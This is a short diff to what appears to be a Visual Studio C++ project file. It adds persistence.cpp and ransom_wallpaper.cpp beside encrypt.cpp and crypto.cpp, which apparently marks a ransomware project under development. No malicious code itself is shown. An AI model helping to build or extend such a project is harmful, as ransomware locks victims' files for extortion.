@@ -142,6 +142,8 @@
   <ItemGroup>
     <ClCompile Include="encrypt.cpp" />
     <ClCompile Include="crypto.cpp" />
+    <ClCompile Include="persistence.cpp" />
+    <ClCompile Include="ransom_wallpaper.cpp" />
     <ClCompile Include="Source.cpp" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
